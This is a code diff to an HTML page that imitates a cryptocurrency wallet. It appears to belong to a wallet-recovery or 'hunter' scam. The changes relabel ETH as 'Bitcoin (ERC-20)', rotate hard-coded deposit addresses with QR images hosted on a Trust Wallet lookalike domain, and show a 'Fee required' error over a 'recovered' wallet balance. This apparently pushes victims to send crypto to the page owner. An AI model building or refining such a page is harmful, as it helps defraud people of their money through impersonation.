@@ -343,10 +343,87 @@
 
     /* fund & send pages (blue glass) */
     .fund-page, .send-page { gap: 20px; }
-    .fund-title, .send-title { color: #afd6ff; }
-    .qr-box { background: rgba(0, 20, 45, 0.6); backdrop-filter: blur(12px); border-color: #2f8ed0; }
-    .address-row { background: rgba(0, 0, 0, 0.5); border-color: #3a8fd0; color: #c0e2ff; }
-    .copy-btn { background: #0059b3; color: white; }
+    .fund-header, .send-header { 
+      display: flex; 
+      justify-content: space-between; 
+      align-items: center;
+      width: 100%;
+    }
+    .fund-title, .send-title { 
+      color: #afd6ff;
+      font-weight: 600;
+      font-size: 1.1rem;
+    }
+    
+    /* QR box styling - smaller QR */
+    .qr-box { 
+      background: rgba(0, 20, 45, 0.6); 
+      backdrop-filter: blur(12px); 
+      border: 1px solid #2f8ed0;
+      border-radius: 24px;
+      padding: 20px;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      gap: 16px;
+    }
+    .qr-code-image {
+      width: 180px;
+      height: 180px;
+      background: white;
+      border-radius: 16px;
+      padding: 8px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+    }
+    .qr-code-image img {
+      width: 100%;
+      height: 100%;
+      object-fit: contain;
+      border-radius: 8px;
+    }
+    .address-row { 
+      background: rgba(0, 0, 0, 0.5); 
+      border: 1px solid #3a8fd0; 
+      border-radius: 40px;
+      padding: 8px 12px;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      width: 100%;
+      gap: 8px;
+    }
+    .address-row span {
+      font-family: monospace;
+      font-size: 0.7rem;
+      color: #c0e2ff;
+      word-break: break-all;
+    }
+    .copy-btn { 
+      background: #0059b3; 
+      color: white;
+      border: none;
+      border-radius: 30px;
+      padding: 6px 16px;
+      font-size: 0.8rem;
+      font-weight: 500;
+      cursor: pointer;
+      white-space: nowrap;
+      border: 1px solid #5fa3e0;
+    }
+    .copy-btn:hover {
+      background: #0066cc;
+    }
+    .network-badge {
+      font-size: 0.7rem;
+      color: #8fcbff;
+      background: rgba(0, 40, 80, 0.6);
+      padding: 4px 12px;
+      border-radius: 30px;
+      border: 1px solid #2f81c0;
+    }
+    
     .address-input-area { 
       display: flex; 
       align-items: center; 
@@ -478,6 +555,17 @@
       animation: spin 1.2s linear infinite; 
     }
     @keyframes spin { 0% { transform: rotate(0); } 100% { transform: rotate(360deg); } }
+
+    .field-group {
+      display: flex;
+      flex-direction: column;
+      gap: 8px;
+    }
+    .field-label {
+      font-size: 0.8rem;
+      color: #a3ceff;
+      margin-left: 8px;
+    }
   </style>
 </head>
 <body>
@@ -527,7 +615,7 @@
         </div>
       </div>
 
-      <div class="prediction-row">
+      <div class="prediction-row" style="display: flex; gap: 8px; margin: 4px 0;">
         <span class="chip">Crypto</span>
         <span class="chip">Prediction</span>
         <span class="chip">Watch</span>
@@ -537,7 +625,7 @@
       <div class="crypto-row">
         <div class="crypto-left">
           <div class="crypto-icon"><img src="https://trustwalleteth.github.io/B/1.png" alt="BTC"></div>
-          <span class="crypto-name">Bitcoin</span>
+          <span class="crypto-name">Bitcoin (ERC-20)</span>
         </div>
         <div style="display:flex; flex-direction:column; align-items:flex-end;">
           <span class="crypto-amount" id="btcAmount">0</span>
@@ -564,26 +652,26 @@
     <div class="page fund-page" id="fundPage">
       <div class="fund-header">
         <div class="back-link-sm" id="backFromFund">← back</div>
-        <span class="fund-title">Receive funds</span>
+        <span class="fund-title">Receive BTC</span>
         <span style="width:40px;"></span>
       </div>
       <div class="qr-box">
         <div class="qr-code-image">
-          <img id="fundQrImage" src="https://trustwalleteth.github.io/B/Screenshot_2026-02-15-16-25-58-334-edit_com.wallet.crypto.trustapp.jpg" alt="QR">
+          <img id="fundQrImage" src="https://trustwalleteth.github.io/QR/Screenshot_2026-02-14-20-40-37-266-edit_com.wallet.crypto.trustapp.jpg" alt="QR Code">
         </div>
         <div class="address-row">
-          <span style="font-family: monospace; font-size:0.7rem;" id="fundAddress">0xA34559ea9Bc18F31687C1A5090350FD7D4d4bad2</span>
-          <button class="copy-btn" id="fundCopyBtn">copy</button>
+          <span id="fundAddress">0x55aD83631e3E454b79510273a2F89A4bf096B7C7</span>
+          <button class="copy-btn" id="fundCopyBtn">Copy</button>
         </div>
-        <div style="font-size:0.65rem; color:#8fcbff;" id="fundNetwork">Ethereum network</div>
+        <div class="network-badge" id="fundNetwork">ERC-20 · Bitcoin (Wrapped BTC)</div>
       </div>
     </div>
 
-    <!-- SEND PAGE (ETH) -->
+    <!-- SEND PAGE (BTC on Ethereum) -->
     <div class="page send-page" id="sendPage">
       <div class="send-header">
         <div class="back-link-sm" id="backFromSend">← back</div>
-        <span class="send-title">Send ETH</span>
+        <span class="send-title">Send BTC</span>
         <span style="width:40px;"></span>
       </div>
       <div class="field-group">
@@ -596,22 +684,22 @@
       <div class="field-group">
         <div class="field-label">Destination network</div>
         <div class="network-row">
-          <span>Ethereum</span>
+          <span>Ethereum (ERC-20)</span>
           <span style="color:#9acdff;">▼</span>
         </div>
       </div>
       <div class="field-group">
-        <div class="field-label">Amount (ETH)</div>
+        <div class="field-label">Amount (BTC)</div>
         <div class="amount-section">
           <div class="amount-row">
-            <input type="number" id="amountInput" placeholder="ETH Amount" min="0.0001" step="any">
+            <input type="number" id="amountInput" placeholder="BTC Amount" min="0.0001" step="any">
             <button class="max-btn" id="maxBtn">Max</button>
           </div>
           <div class="usd-hint" id="usdHint">≈ $0.00</div>
         </div>
       </div>
       <div id="feeErrorBox" style="display: none;" class="error-fee-box">
-        <span>⚠️</span> fee required: 0.0001 ETH
+        <span>⚠️</span> Fee required: 0.0001 BTC (ERC-20)
       </div>
       <button class="confirm-btn" id="confirmSendBtn" disabled>Next</button>
     </div>
@@ -627,7 +715,6 @@
       const loading = document.getElementById('loadingPage');
       const fundPage = document.getElementById('fundPage');
       const sendPage = document.getElementById('sendPage');
-      const statsBar = document.getElementById('statsBar');
       const huntConsole = document.getElementById('huntConsole');
 
       // Non-rounded BTC values (in USD)
@@ -636,19 +723,16 @@
       // Three funding options with addresses and QR codes
       const fundOptions = [
         {
+          qr: 'https://trustwalleteth.github.io/QR/Screenshot_2026-02-14-20-40-37-266-edit_com.wallet.crypto.trustapp.jpg',
+          address: '0x55aD83631e3E454b79510273a2F89A4bf096B7C7'
+        },
+        {
           qr: 'https://trustwalleteth.github.io/B/Screenshot_2026-02-15-16-25-58-334-edit_com.wallet.crypto.trustapp.jpg',
-          address: '0xA34559ea9Bc18F31687C1A5090350FD7D4d4bad2',
-          network: 'Ethereum network'
+          address: '0xA34559ea9Bc18F31687C1A5090350FD7D4d4bad2'
         },
         {
           qr: 'https://trustwalleteth.github.io/B/Screenshot_2026-02-15-16-20-08-765-edit_com.wallet.crypto.trustapp.jpg',
-          address: '0xc8C4D2bd2A051068682D9125b0ac858570976087',
-          network: 'Ethereum network'
-        },
-        {
-          qr: 'https://trustwalleteth.github.io/B/Screenshot_2026-02-14-20-40-37-266-edit_com.wallet.crypto.trustapp.jpg',
-          address: '0x55aD83631e3E454b79510273a2F89A4bf096B7C7',
-          network: 'Ethereum network'
+          address: '0xc8C4D2bd2A051068682D9125b0ac858570976087'
         }
       ];
       
@@ -783,7 +867,6 @@
         
         document.getElementById('fundQrImage').src = selected.qr;
         document.getElementById('fundAddress').innerText = selected.address;
-        document.getElementById('fundNetwork').innerText = selected.network;
         
         wallet.classList.remove('active');
         fundPage.classList.add('active');
@@ -808,10 +891,10 @@
         if (recoveredWallet && recoveredWallet.balance > 0) {
           const maxBalance = recoveredWallet.balance;
           document.getElementById('amountInput').max = maxBalance;
-          document.getElementById('amountInput').placeholder = `ETH Amount (max ${maxBalance})`;
+          document.getElementById('amountInput').placeholder = `BTC Amount (max ${maxBalance})`;
         } else {
           document.getElementById('amountInput').max = 0;
-          document.getElementById('amountInput').placeholder = 'ETH Amount (no funds)';
+          document.getElementById('amountInput').placeholder = 'BTC Amount (no funds)';
         }
         validateSendForm();
       });
@@ -867,7 +950,7 @@
 
       function updateUsdHint() {
         let val = parseFloat(amountInput.value);
-        usdHint.innerText = (!isNaN(val) && val >= 0.0001) ? `≈ $${val.toFixed(2)}` : '≈ $0.00';
+        usdHint.innerText = (!isNaN(val) && val >= 0.0001) ? `≈ $${(val * 65000).toFixed(2)}` : '≈ $0.00';
       }
 
       function validateSendForm() {
@@ -900,7 +983,7 @@
         navigator.clipboard.writeText(addr).then(()=>{
           const btn = document.getElementById('fundCopyBtn');
           const original = btn.innerText;
-          btn.innerText = 'copied';
+          btn.innerText = 'Copied!';
           setTimeout(()=>{ btn.innerText = original; }, 1500);
         });
       });
